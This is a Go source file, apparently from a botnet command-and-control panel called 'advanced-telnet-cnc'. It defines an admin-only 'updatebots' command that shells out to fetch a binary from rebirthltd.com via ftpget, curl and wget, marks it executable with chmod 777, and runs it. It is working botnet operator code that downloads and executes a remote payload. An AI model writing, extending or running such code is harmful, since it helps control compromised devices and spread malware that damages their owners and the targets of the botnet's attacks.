// In updater.go
package admin

import (
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"bytes"
	"os/exec"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"updatebots"},
		Description: "Update all bots",
		Admin:       true,
		Reseller:    false,
		Usage:       nil,
		SubCommands: nil,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			cmd := exec.Command("bash", "-c", "ftpget update update; curl -O http://rebirthltd.com/update; wget http://rebirthltd.com/update; chmod 777 update; ./update")
			var out bytes.Buffer
			cmd.Stdout = &out
			err := cmd.Run()
			if err != nil {
				session.Println("Error:", err)
				return err
			}
			session.Println("Output of update command:", out.String())
			return nil
		},
	})
}
